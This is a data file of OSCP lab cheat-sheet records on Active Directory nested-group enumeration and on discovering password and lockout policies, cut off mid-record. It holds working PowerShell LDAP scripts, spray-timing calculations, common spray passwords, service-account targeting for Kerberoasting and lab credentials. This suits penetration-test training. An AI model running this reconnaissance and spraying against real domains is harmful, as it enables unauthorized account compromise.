"ad-group-enumeration","Active Directory Group Enumeration & Nested Group Unraveling","Comprehensive group membership enumeration including recursive nested group traversal, member identification, and flag extraction - essential for OSCP lab challenges","ACTIVE_DIRECTORY|ENUMERATION|GROUPS|NESTED_GROUPS|POWERSHELL|POWERVIEW|FLAG_EXTRACTION|OSCP:HIGH|STARTER","{""how_to_recognize"": [""OSCP lab instruction: 'Enumerate group <NAME> and find all members including nested groups'"", ""Lab instruction: 'Find the last user member and extract the flag'"", ""Lab instruction: 'Identify which new user is in Domain Admins'"", ""You see a group (Domain Admins, Service Personnel, IT Support) and need to know who's actually in it"", ""Group.Properties.member shows CN= paths that include other groups (nested groups present)""], ""when_to_look_for"": [""OSCP exam: Questions specifically mention 'nested groups' or 'enumerate group membership'"", ""After initial AD enumeration when you've identified interesting groups"", ""When looking for privilege escalation paths via group membership"", ""Before lateral movement - need to know which users have admin rights on which machines"", ""When group membership output shows other group DNs (not just user DNs) - indicates nesting""]}","[{""title"": ""Scenario 1: Unravel 'Service Personnel' Nested Groups for Flag"", ""context"": ""OSCP Lab: You're logged into CLIENT75 as 'stephanie' (domain user corp\\stephanie). Lab instructions say: 'Use PowerView or PowerShell to enumerate the Service Personnel group. Unravel nested groups and find the flag in the last direct user member.' You have PowerShell access and the LDAPSearch function available. The group contains a mix of users and nested groups multiple levels deep."", ""approach"": ""Step 1: Create LDAPSearch function for manual queries.\n\nStep 2: Query 'Service Personnel' group to get direct members:\n  LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=Service Personnel))\""\n  Extract member Distinguished Names from Properties.member attribute.\n\nStep 3: For each member DN, query to determine type:\n  LDAPSearch -LDAPQuery \""(distinguishedName=<DN>)\""\n  Check objectClass property: 'group' = nested group (recurse), 'user' = leaf node (record).\n\nStep 4: Build recursive function Get-NestedGroupMember:\n  - Maintains $script:AllUsers array to collect discovered users\n  - Uses $Depth parameter for tree indentation\n  - Recursively calls itself when encountering nested groups\n  - Depth-first traversal ensures systematic coverage.\n\nStep 5: Execute enumeration and extract flag:\n  Get-NestedGroupMember -GroupName \""Service Personnel\""\n  Access last user: $script:AllUsers[-1]\n  Check flag locations: description, info, comment attributes."", ""commands"": [""ps-ldapsearch-function"", ""ps-get-group-members-basic"", ""ps-nested-group-check-member-type"", ""ps-nested-group-recursive-function"", ""ps-get-last-nested-user"", ""ps-extract-flag-from-user""], ""expected_outcome"": ""Output shows hierarchical tree:\n\n[+] Service Personnel\n  [USER] stephanie\n  [USER] jeff\n  [GROUP] IT Support\n    [GROUP] Developers\n      [USER] john_dev\n\nLAST USER: john_dev\nFLAG LOCATIONS:\ndescription : flag{nested_groups_unraveled_success}\n\nThe 'last user' is the final user discovered during depth-first traversal (john_dev). Flag is in the description attribute. Total enumeration time: 15-20 seconds including manual typing. Copy-paste one-liner completes in 10 seconds."", ""why_this_works"": ""Active Directory stores group members in the 'member' attribute as Distinguished Names. When a DN references another group (CN=IT Support,CN=Users,...), that's a nested group requiring recursive enumeration. The objectClass attribute distinguishes groups from users. Recursion naturally handles arbitrary nesting depth (OSCP labs typically 2-4 levels). The $script: scope persists the AllUsers array across recursive calls without polluting global scope. Array index [-1] always gets the last element regardless of total count. Flags are stored in user attributes (description most common) - these are standard AD text fields administrators populate.""}, {""title"": ""Scenario 2: Identify New Domain Admin User"", ""context"": ""OSCP Lab: Instructions say: 'A new user has been added to Domain Admins. Identify the username.' You're on CLIENT75 as stephanie with PowerShell access. The domain is corp.com with a few legacy Domain Admins (Administrator, krbtgt may be members) and one recently added account. You need to determine which account is newest based on creation date."", ""approach"": ""Step 1: Query Domain Admins group membership:\n  LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=Domain Admins))\""\n  Extract all member DNs from Properties.member.\n\nStep 2: For each member, query full user object:\n  LDAPSearch -LDAPQuery \""(distinguishedName=<DN>)\""\n  Extract: samAccountName (username), whencreated (creation timestamp).\n\nStep 3: Sort by creation date:\n  Create PSCustomObject with Name, Created, DN\n  Sort-Object Created (oldest first)\n  Display in table format.\n\nStep 4: Identify newest account:\n  Last entry in sorted list = newest account\n  Built-in accounts (Administrator) have creation date = domain creation (years old)\n  New account has recent timestamp (days/weeks old).\n\nAlternative (PowerView): Get-DomainGroupMember -Identity \""Domain Admins\"" | Select MemberName"", ""commands"": [""ps-ldapsearch-function"", ""ps-find-new-domain-admin""], ""expected_outcome"": ""Output table:\n\nName            Created                  DN\n----            -------                  --\nAdministrator   2018-05-14 08:23:15     CN=Administrator,CN=Users,DC=corp,DC=com\nkrbtgt          2018-05-14 08:24:01     CN=krbtgt,CN=Users,DC=corp,DC=com\njeff_admin      2024-11-06 14:35:22     CN=jeff_admin,CN=Users,DC=corp,DC=com\n\nAnswer: jeff_admin (newest whencreated timestamp). Built-in accounts are years old (domain creation date). New account is recent (days/weeks old). Time: 10 seconds."", ""why_this_works"": ""Every AD object has a whencreated attribute populated at creation time (UTC timestamp). This is immutable - cannot be modified even by Domain Admins. Sorting by whencreated chronologically reveals account creation order. Built-in accounts (Administrator, krbtgt, Guest) are created during domain setup (dcpromo) and always have oldest timestamps. User-created accounts have timestamps matching when they were added. OSCP labs typically have 1-2 legacy accounts and 1 new account for the answer.""}, {""title"": ""Scenario 3: Service Account Discovery in Group Hierarchies"", ""context"": ""You've enumerated the 'Service Personnel' group and found multiple nested groups (IT Support, Database Admins, Backup Operators). You suspect service accounts are buried in these groups - service accounts often have weak passwords and high privileges. You need to identify all service accounts across the entire group hierarchy for targeted password attacks."", ""approach"": ""Step 1: Enumerate entire group hierarchy:\n  Get-NestedGroupMember -GroupName \""Service Personnel\"" -UsersOnly\n  Collects all users at all nesting levels.\n\nStep 2: Filter by naming patterns:\n  Common patterns: *svc*, *sql*, *backup*, *service*, sa (SQL Server default)\n  Use PowerShell Where-Object: | Where-Object { $_.samaccountname -like \""*svc*\"" }\n\nStep 3: Check for SPNs (Kerberoastable):\n  LDAPSearch -LDAPQuery \""(&(objectCategory=user)(servicePrincipalName=*))\""\n  Service accounts often have SPNs registered (HTTP/sql01.corp.com)\n\nStep 4: Identify high-value targets:\n  - Check pwdlastset (old = password rarely changed)\n  - Check adminCount (1 = privileged account)\n  - Check description (often contains password hints)\n\nPowerView alternative: Get-DomainGroupMember -Identity \""Service Personnel\"" -Recurse | Where-Object { $_.MemberName -like \""*svc*\"" }"", ""commands"": [""ps-nested-group-recursive-function"", ""ps-powerview-find-service-accounts"", ""ps-ldapsearch-spns""], ""expected_outcome"": ""Discovery of service accounts:\n\n[USER] sql_svc\n[USER] backup_service\n[USER] iis_appool\n\nWith details:\nsql_svc:\n  description: SQL Server service account - password in vault\n  pwdlastset: 2018-05-14 (6 years old - likely weak password)\n  servicePrincipalName: MSSQLSvc/SQL01.corp.com:1433\n  adminCount: 1 (privileged)\n\nTarget sql_svc for:\n- Kerberoasting (has SPN)\n- Password spray (description hints at password location)\n- Over-privileged (adminCount=1, likely in Domain Admins)\n\nTime: 30 seconds for complete service account profiling."", ""why_this_works"": ""Service accounts follow naming conventions for identification (*svc*, *sql*, *service*). They require SPNs for Kerberos authentication (servicePrincipalName attribute). Administrators rarely rotate service account passwords (business impact if changed) - pwdlastset timestamps reveal this. Service accounts are often over-privileged (added to Domain Admins for convenience) - adminCount=1 indicates this. Description fields contain password hints, vault references, or occasionally plaintext passwords. Combining group membership + naming pattern + SPN + password age identifies high-value targets for credential attacks.""}, {""title"": ""Scenario 4: PowerView vs Manual .NET - Method Comparison"", ""context"": ""You have RDP access to CLIENT75 and need to enumerate nested groups. You're unsure whether to use PowerView (if available) or manual .NET methods. You need to understand the tradeoffs: speed vs stealth, tool dependency vs native capabilities, OSCP exam reliability."", ""approach"": ""PowerView Method (if available):\n  1. Check if loaded: Get-Command Get-DomainGroupMember\n  2. If not loaded: Import-Module .\\PowerView.ps1 or IEX download\n  3. Check version: Try Get-NetGroupMember (v2.0) vs Get-DomainGroupMember (v3.0+)\n  4. Execute: Get-DomainGroupMember -Identity \""<GROUP>\"" -Recurse\n  5. Filter users: | Where-Object { $_.MemberObjectClass -eq \""user\"" }\n  6. Get details: Get-DomainUser -Identity <USERNAME> | Format-List *\n  Time: 5 seconds (if PowerView loaded), 60 seconds (if need to download/import).\n\nManual .NET Method (always available):\n  1. Create LDAPSearch function (30 lines of PowerShell)\n  2. Create Get-NestedGroupMember recursive function\n  3. Execute enumeration\n  4. Extract user details from $script:AllUsers array\n  Time: 20 seconds (if typing), 10 seconds (if copy-paste one-liner).\n\nTradeoffs:\n  PowerView: Fast, feature-rich, well-documented | Requires import, may trigger AV, version compatibility issues\n  Manual .NET: Always available, native code, no imports | More typing, need to understand recursion logic"", ""commands"": [""powerview-get-domaingroup-recursive"", ""ps-powerview-get-user-details"", ""ps-nested-group-one-liner"", ""ps-compare-powerview-versions""], ""expected_outcome"": ""Decision matrix:\n\nUse PowerView when:\n- Already loaded/available\n- Time-critical (OSCP exam - 5 hour timer)\n- Need additional features (ACL enumeration, GPO abuse)\n- Stealth not a concern\n\nUse Manual .NET when:\n- PowerView unavailable/blocked\n- AV detects PowerView import\n- Constrained Language Mode (PowerView may fail)\n- Learning exercise (understand LDAP queries)\n- Version compatibility issues (v2.0 vs v3.0+ confusion)\n\nOSCP Exam Recommendation:\nKnow BOTH methods. PowerView is faster but not guaranteed available. Manual .NET always works. Have the one-liner ready to copy-paste: ps-nested-group-one-liner command.\n\nTime comparison:\n  PowerView (loaded): 5 seconds\n  PowerView (need import): 60 seconds + AV risk\n  Manual .NET (typing): 20 seconds\n  Manual .NET (one-liner): 10 seconds"", ""why_this_works"": ""PowerView is a PowerShell module wrapping LDAP/SMB .NET APIs. It provides convenience (automatic recursion, SID resolution, formatted output) but adds dependency (need to import, version compatibility). Manual .NET methods use System.DirectoryServices.DirectorySearcher - built into Windows .NET Framework since Windows 2000. No imports required, no version issues, works in restricted environments. Both methods generate identical LDAP traffic (port 389 queries to DC). The recursion logic is the same - PowerView just abstracts it. OSCP exam reliability: Manual methods never fail due to missing tools. PowerView fails if blocked by AV, AppLocker, or Constrained Language Mode.""}, {""title"": ""Scenario 5: Complete OSCP Lab Workflow - Group to Flag"", ""context"": ""Full OSCP lab scenario: 'Start VM Group 2, log in to CLIENT75 as stephanie. Use PowerShell to enumerate the Service Personnel group, starting with basic enumeration. Unravel nested groups, enumerate attributes for the last direct user member, and obtain the flag.' This is the complete step-by-step workflow from login to flag submission."", ""approach"": ""Step 1 - Verify domain access:\n  whoami /fqdn\n  Expected: corp\\stephanie\n  Confirms domain credentials and context.\n\nStep 2 - Open PowerShell:\n  Start menu \u2192 Windows PowerShell\n  Or from cmd: powershell.exe\n\nStep 3 - Create LDAP infrastructure:\n  Paste LDAPSearch function (ps-ldapsearch-function)\n  Verify: LDAPSearch -LDAPQuery \""(objectClass=user)\""\n  Should return user objects.\n\nStep 4 - Basic group enumeration:\n  LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=Service Personnel))\""\n  Check Properties.member to see if nested groups exist\n  Look for CN= paths containing other group names.\n\nStep 5 - Recursive enumeration (choose method):\n  Method A (PowerView): Get-DomainGroupMember -Identity \""Service Personnel\"" -Recurse\n  Method B (Manual): Copy-paste ps-nested-group-one-liner\n\nStep 6 - Identify last user:\n  PowerView: ($members | Where-Object { $_.MemberObjectClass -eq \""user\"" })[-1]\n  Manual: $script:AllUsers[-1]\n\nStep 7 - Extract all attributes:\n  PowerView: Get-DomainUser -Identity <USERNAME> | Format-List *\n  Manual: foreach ($prop in $lastUser.Properties.PropertyNames) { \""$prop : $($lastUser.Properties[$prop])\"" }\n\nStep 8 - Locate flag:\n  Search output for 'description', 'info', 'comment' fields\n  Flag format: flag{...}, OS{...}, or plaintext\n  Sometimes Base64 encoded.\n\nStep 9 - Submit flag:\n  Copy exact flag value\n  Paste into lab submission box\n  Document process in enumeration.md"", ""commands"": [""ps-ldapsearch-function"", ""ps-get-group-members-basic"", ""ps-nested-group-recursive-function"", ""ps-get-last-nested-user"", ""ps-extract-flag-from-user"", ""ps-nested-group-one-liner""], ""expected_outcome"": ""Complete walkthrough:\n\n1. Login confirmed: corp\\stephanie@CLIENT75\n2. PowerShell opened\n3. LDAPSearch function created (30 seconds)\n4. Group queried: Service Personnel has 3 direct members\n5. Recursion reveals structure:\n   Service Personnel\n     stephanie (user)\n     jeff (user)\n     IT Support (group)\n       Developers (group)\n         john_dev (user)\n6. Last user identified: john_dev\n7. Attributes extracted: 50+ properties\n8. Flag found in description: flag{nested_enumeration_complete}\n9. Flag submitted successfully\n\nTotal time: 2-3 minutes (first time), 30 seconds (with practice)\n\nOSCP exam application:\n- Same pattern appears in exam labs\n- 'Find flag in nested group' worth 10 points typically\n- Fast completion = more time for other machines\n- Always document your methodology"", ""why_this_works"": ""This workflow combines reconnaissance (verify domain context), tool selection (PowerView vs manual), systematic enumeration (breadth-first group discovery, depth-first nested traversal), and targeted extraction (last user attribute search). Each step has a verification point (does output match expected?). The workflow handles both PowerView availability scenarios (use if available, fallback to manual if not). Time estimates are realistic for OSCP exam conditions (pressure, unfamiliar environment). Documentation habit (enumeration.md) reinforces methodology for exam report. This is the exact pattern used in OffSec lab exercises - practicing this workflow builds muscle memory for exam day.""}]","[{""title"": ""Phase 1: Group Discovery & Basic Enumeration"", ""notes"": ""Start by identifying target groups and their direct members. Determine if nested groups exist by checking member Distinguished Names. If member DNs reference other groups (CN=GroupName in member list), nesting is present and requires recursion."", ""commands"": [{""id"": ""ps-ldapsearch-function"", ""example"": ""function LDAPSearch { param ([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\""LDAP://$PDC/$DistinguishedName\""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }"", ""shows"": ""Function created successfully""}, {""id"": ""ps-get-group-members-basic"", ""example"": ""$groupResult = LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=Domain Admins))\""; $group = $groupResult[0]; $group.Properties.member"", ""shows"": ""CN=""}]}, {""title"": ""Phase 2: Member Type Identification"", ""notes"": ""For each group member (by Distinguished Name), query the object to determine if it's a user (leaf node - record) or nested group (branch node - recurse). Use objectClass attribute: 'group' = nested group, 'user' = leaf user."", ""commands"": [{""id"": ""ps-nested-group-check-member-type"", ""example"": ""$memberDN = \""CN=Administrator,CN=Users,DC=corp,DC=com\""; $memberSearch = LDAPSearch -LDAPQuery \""(distinguishedName=$memberDN)\""; $member = $memberSearch[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains \""group\"") { Write-Host \""[GROUP] $($member.Properties.name[0])\"" -ForegroundColor Magenta } elseif ($objectClass -contains \""user\"") { Write-Host \""[USER] $($member.Properties.name[0])\"" -ForegroundColor Green }"", ""shows"": ""[GROUP]""}]}, {""title"": ""Phase 3: Recursive Nested Group Traversal"", ""notes"": ""Implement or use recursive function to systematically traverse the group hierarchy. Maintain a collection ($script:AllUsers) of discovered users. Use depth-first traversal with indentation for visualization. Handle arbitrary nesting depth (OSCP labs typically 2-4 levels)."", ""commands"": [{""id"": ""ps-nested-group-recursive-function"", ""example"": ""function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = \""  \"" * $Depth; Write-Host \""$indent[+] $GroupName\"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=$GroupName))\""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery \""(distinguishedName=$memberDN)\""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains \""group\"") { Write-Host \""$indent  [GROUP] $memberName\"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains \""user\"") { Write-Host \""$indent  [USER] $memberName\"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName \""Service Personnel\"""", ""shows"": ""[+]""}, {""id"": ""ps-nested-group-one-liner"", ""example"": ""function LDAPSearch { param([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\""LDAP://$PDC/$DN\""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }; function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = \""  \"" * $Depth; Write-Host \""$indent[+] $GroupName\"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=$GroupName))\""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery \""(distinguishedName=$memberDN)\""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains \""group\"") { Write-Host \""$indent  [GROUP] $memberName\"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains \""user\"") { Write-Host \""$indent  [USER] $memberName\"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName \""Service Personnel\""; if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host \""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])\"" -ForegroundColor Yellow; Write-Host \""[+] FLAG LOCATIONS:\"" -ForegroundColor Yellow; @('description','info','comment') | ForEach-Object { $value = $lastUser.Properties[$_][0]; if ($value) { Write-Host \""$_ : $value\"" -ForegroundColor Cyan } } }"", ""shows"": ""Hierarchical tree output""}]}, {""title"": ""Phase 4: PowerView Alternative Methods"", ""notes"": ""If PowerView is available, use automated cmdlets for faster enumeration. Check version compatibility (v2.0 uses -GroupName, v3.0+ uses -Identity). Use -Recurse parameter for automatic nested group traversal. PowerView flattens hierarchy into single list."", ""commands"": [{""id"": ""powerview-get-domaingroup-recursive"", ""example"": ""Get-DomainGroupMember -Identity \""Domain Admins\"" -Recurse"", ""shows"": ""MemberName""}, {""id"": ""ps-powerview-get-user-details"", ""example"": ""Get-DomainUser -Identity \""jeff_admin\"" | Format-List *"", ""shows"": ""samaccountname""}, {""id"": ""ps-compare-powerview-versions"", ""example"": ""Get-Command Get-NetGroupMember -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ParameterSets | Select-Object -First 1 | Select-Object -ExpandProperty Parameters | Select-Object Name | Where-Object { $_.Name -like \""*Group*\"" -or $_.Name -like \""*Identity*\"" }"", ""shows"": ""GroupName""}]}, {""title"": ""Phase 5: User Attribute Extraction & Flag Discovery"", ""notes"": ""After identifying target user (often 'last user' in enumeration), extract all AD attributes. Focus on text fields: description (most common flag location), info, comment, adminDescription. Check for Base64 encoding. Format: flag{...}, OS{...}, or plaintext hints."", ""commands"": [{""id"": ""ps-get-last-nested-user"", ""example"": ""if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host \""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])\"" -ForegroundColor Yellow; foreach ($prop in $lastUser.Properties.PropertyNames) { Write-Host \""$prop : $($lastUser.Properties[$prop])\"" -ForegroundColor White } } else { Write-Host \""[-] No users found\"" -ForegroundColor Red }"", ""shows"": ""LAST USER:""}, {""id"": ""ps-extract-flag-from-user"", ""example"": ""$user = LDAPSearch -LDAPQuery \""(samAccountName=jeff_admin)\""; $user = $user[0]; Write-Host \""`n[+] Checking flag locations:\"" -ForegroundColor Yellow; @('description','info','comment','adminDescription','userParameters') | ForEach-Object { $value = $user.Properties[$_][0]; if ($value) { Write-Host \""$_ : $value\"" -ForegroundColor Cyan } }"", ""shows"": ""description :""}, {""id"": ""ps-powerview-get-user-details"", ""example"": ""Get-DomainUser -Identity \""jeff_admin\"" | Format-List *"", ""shows"": ""samaccountname""}]}, {""title"": ""Phase 6: Specialized Queries - Service Accounts & New Admins"", ""notes"": ""Advanced group enumeration: Find service accounts by naming pattern (*svc*, *sql*) combined with SPN presence. Identify new Domain Admins by sorting on whencreated timestamp. Profile high-value targets for credential attacks (old passwords, over-privileged, Kerberoastable)."", ""commands"": [{""id"": ""ps-find-new-domain-admin"", ""example"": ""LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=Domain Admins))\"" | ForEach-Object { $_.Properties.member } | ForEach-Object { $memberDN = $_; $userSearch = LDAPSearch -LDAPQuery \""(distinguishedName=$memberDN)\""; $user = $userSearch[0]; [PSCustomObject]@{ Name = $user.Properties.samaccountname[0]; Created = $user.Properties.whencreated[0]; DN = $memberDN } } | Sort-Object Created | Format-Table -AutoSize"", ""shows"": ""Name""}, {""id"": ""ps-powerview-find-service-accounts"", ""example"": ""Get-DomainGroupMember -Identity \""Service Personnel\"" -Recurse | Where-Object { $_.MemberObjectClass -eq \""user\"" -and $_.MemberName -like \""*svc*\"" }"", ""shows"": ""MemberName""}, {""id"": ""ps-ldapsearch-spns"", ""example"": ""LDAPSearch -LDAPQuery \""(&(objectClass=user)(servicePrincipalName=*))\"""", ""shows"": ""serviceprincipalname""}]}]"
"ad-account-policy-discovery","Active Directory Account Policy Discovery","Methods for discovering Active Directory password and account lockout policies from different network positions - critical for safe password spraying","ACTIVE_DIRECTORY|PASSWORD_POLICY|ENUMERATION|OSCP:HIGH|WORKFLOW","{""how_to_recognize"": [""You're about to perform password spraying or brute force attacks against Active Directory"", ""You need to know the lockout threshold to avoid locking accounts"", ""You want to calculate safe spray timing (attempts per observation window)"", ""You need password complexity requirements for targeted password list creation""], ""when_to_look_for"": [""IMMEDIATELY before any password attack (spraying, brute force, credential stuffing)"", ""During initial reconnaissance of Active Directory environment"", ""Before testing default credentials against multiple accounts"", ""OSCP exam: Before attempting any authentication against domain accounts (lockouts = failed objective)""]}","[{""title"": ""Scenario 1: Policy Check from Domain-Joined Windows System"", ""context"": ""You've compromised a Windows 10 workstation CLIENT75 via web exploitation. You have command execution as domain user corp\\webuser (standard user, non-admin). The system is domain-joined to corp.com. You need to discover the password policy quickly before attempting password spraying. You have PowerShell access."", ""approach"": ""Use built-in net.exe command to query domain password policy. This is the FASTEST and SIMPLEST method when you have access to any domain-joined Windows system. Works from cmd.exe or PowerShell, requires no special privileges (any domain user can read password policy), and completes in <5 seconds. This is your go-to method during OSCP exam when you compromise a Windows box."", ""commands"": [""net-accounts-policy""], ""expected_outcome"": ""OUTPUT INTERPRETATION: Force user logoff: Never (users not forced to logout). Minimum password age: 1 day (can't change password more than once per day). Maximum password age: 42 days (password expires after 42 days). Minimum password length: 7 characters (passwords must be at least 7 chars). Password history: 24 (can't reuse last 24 passwords). CRITICAL LOCKOUT SETTINGS: Lockout threshold: 5 (5 failed attempts locks account). Lockout duration: 30 minutes (account locked for 30min after threshold reached). Lockout observation window: 30 minutes (failed attempt counter resets 30min after last failed attempt). SAFE SPRAY CALCULATION: 5 threshold = max 4 attempts per user safely. 30min observation window = wait 30min between spray rounds. Result: Spray 4 passwords, wait 30min, spray 4 more, repeat. TIME ESTIMATE: <5 seconds."", ""why_this_works"": ""net accounts queries the domain controller's password policy via MS-SAMR RPC over SMB. This information is stored in the domain's Default Domain Policy GPO (Group Policy Object) and is readable by ANY authenticated domain user - no special permissions required. The policy applies domain-wide to all user accounts. Windows automatically contacts the domain controller when you run this command (you don't need to specify DC name). CRITICAL FOR OSCP: This is the most reliable method when you have Windows access. No tools to upload, no PowerShell modules to import, works even with AppLocker restrictions. MANUAL ALTERNATIVE: Open gpedit.msc \u2192 Computer Configuration \u2192 Windows Settings \u2192 Security Settings \u2192 Account Policies \u2192 Account Lockout Policy (requires GUI access). AUTOMATION: Parse output with PowerShell: (net accounts) -match 'Lockout threshold' | %{$_.Split(':')[1].Trim()} returns just the number (5).""}, {""title"": ""Scenario 2: Policy Check from Linux with NULL Session (External/No Credentials)"", ""context"": ""You're performing an external penetration test. You've discovered a domain controller at 192.168.50.70 via port scanning (ports 139/445 SMB are open). You have NO credentials yet but want to discover the password policy before attempting password spraying. You're on a Kali Linux attack box. The domain is corp.com (determined via SMB enumeration)."", ""approach"": ""Attempt NULL SESSION enumeration with enum4linux. Null sessions are anonymous SMB connections that were enabled by default on older Windows versions for backward compatibility. Many organizations still allow null sessions for legacy application support. This is a PRIVILEGE-FREE method - no credentials required. If null sessions are blocked, move to Scenario 3 (with credentials)."", ""commands"": [""enum4linux-policy""], ""expected_outcome"": ""SUCCESS CASE (null session allowed): OUTPUT shows [+] Password Info for Domain: corp.com. Password Complexity: Enabled. Minimum Password Length: 7. Lockout Threshold: 5. Account Lockout Duration: 30 minutes. Reset Account Lockout Counter: 30 minutes. FAILURE CASE (null session blocked): NT_STATUS_ACCESS_DENIED or NT_STATUS_INVALID_PARAMETER. Error means null sessions are disabled (common on modern domains). NEXT STEP if blocked: Get ANY valid credentials (even guest account) and retry with enum4linux -u guest -p '' -P 192.168.50.70 OR use crackmapexec-policy with credentials. TIME ESTIMATE: 10-30 seconds. MODERN DOMAINS: Windows Server 2008 R2+ block null sessions by default. Success rate: ~20% on modern networks, ~60% on legacy networks."", ""why_this_works"": ""NULL SESSION = anonymous SMB connection using empty username and password. Enabled via registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\RestrictNullSessAccess=0. When allowed, you can connect to IPC$ share anonymously and query MS-SAMR RPC interface for password policy. WHY SOMETIMES ALLOWED: Legacy applications (old network printers, backup software, monitoring tools) may require null session access. Administrators enable it for compatibility and forget to disable. DETECTION EVASION: Null session enumeration is VERY stealthy - appears as normal SMB anonymous bind, often not logged or alerted. ALTERNATIVE SYNTAX: rpcclient -N -U '' 192.168.50.70 then run 'getdompwinfo' command (manual method). OSCP TIP: Always TRY null session first before using credentials - you might not need authentication at all.""}, {""title"": ""Scenario 3: Policy Check from Linux with Valid Credentials"", ""context"": ""You're on Kali Linux with network access to corp.com domain. You've obtained credentials jeff:HenchmanPutridBonbon11 via password spraying (lucky guess or OSINT). You need to retrieve the password policy to calculate safe spray limits for additional passwords. Domain controller is at 192.168.50.70. SMB null sessions are blocked (verified via enum4linux failure)."", ""approach"": ""Use CrackMapExec with the --pass-pol flag to dump password policy via authenticated SMB. This is the MODERN method that works when null sessions are disabled. Any valid domain user credentials work - even guest account with blank password. CrackMapExec supports SMBv2/SMBv3 (enum4linux requires SMBv1). This is your fallback when Scenario 2 fails."", ""commands"": [""crackmapexec-policy""], ""expected_outcome"": ""OUTPUT: [+] Dumping password policy. Minimum password length: 7. Password complexity: Enabled. Lockout threshold: 5. Lockout duration (minutes): 30. Lockout observation window (minutes): 30. INTERPRETATION: Complexity enabled = password must contain 3 of 4 categories (uppercase, lowercase, numbers, symbols). Minimum length 7 = shortest allowed password. Lockout 5 = max 4 safe attempts per observation window. SAFE SPRAY STRATEGY: Test 4 common passwords (Password123!, Welcome2023!, Summer2023!, Winter2023!), wait 30min for observation window reset, test 4 more. Over 24 hours = 192 safe attempts per user (4 attempts \u00d7 48 thirty-minute windows). TIME ESTIMATE: 5-15 seconds."", ""why_this_works"": ""CrackMapExec authenticates to domain controller via SMB using provided credentials. After successful authentication, it queries password policy via MS-SAMR RPC interface (same as net accounts but over SMB from Linux). Password policy is stored in Default Domain Policy GPO and readable by ANY authenticated user. ADVANTAGES OVER ENUM4LINUX: (1) Supports SMBv2/SMBv3 (enum4linux requires SMBv1, often disabled). (2) Supports Kerberos authentication (not just NTLM). (3) Better error messages. (4) Actively maintained. GUEST ACCOUNT TRY: Many domains have guest account enabled with blank password. Try: crackmapexec smb 192.168.50.70 -u 'guest' -p '' --pass-pol. If successful, you got policy without burning your real credentials. OSCP TIP: Use CrackMapExec as default policy check tool on Linux. More reliable than enum4linux on modern domains.""}, {""title"": ""Scenario 4: Policy Check via LDAP - Detailed Attribute Extraction"", ""context"": ""You're on Kali Linux performing deep enumeration of corp.com. You have credentials corp\\jeff:HenchmanPutridBonbon11. You want to extract password policy AND additional attributes (password age, complexity settings, Kerberos policy) that SMB-based tools don't show. Domain controller is at 192.168.50.70. You need detailed policy information for advanced attacks (AS-REP roasting timing, password complexity patterns)."", ""approach"": ""Use ldapsearch to query password policy attributes directly from Active Directory LDAP. This provides RAW LDAP attributes with most detail but requires manual interpretation. Use this when you need complete policy information beyond basic lockout settings. Requires LDAP port 389 access and valid credentials (anonymous LDAP rarely allowed on modern domains)."", ""commands"": [""ldapsearch-policy""], ""expected_outcome"": ""OUTPUT (raw LDAP attributes): lockoutThreshold: 5. lockoutDuration: -18000000000 (100-nanosecond intervals, NEGATIVE value). lockOutObservationWindow: -18000000000. minPwdLength: 7. pwdProperties: 1 (bitmask: 1=complexity enabled). CONVERSION REQUIRED: lockoutDuration and lockOutObservationWindow are in 100-nanosecond intervals and NEGATIVE (Windows FILETIME format). Convert: -18000000000 \u00f7 600000000 = 30 minutes. MANUAL CALCULATION: Take absolute value (18000000000) \u2192 divide by 600000000 \u2192 result in minutes (30). BITMASK: pwdProperties is bitmask: 0=no complexity, 1=complexity enabled. ADDITIONAL ATTRIBUTES (query separately): maxPwdAge: maximum password age. minPwdAge: minimum password age. pwdHistoryLength: password history count. TIME 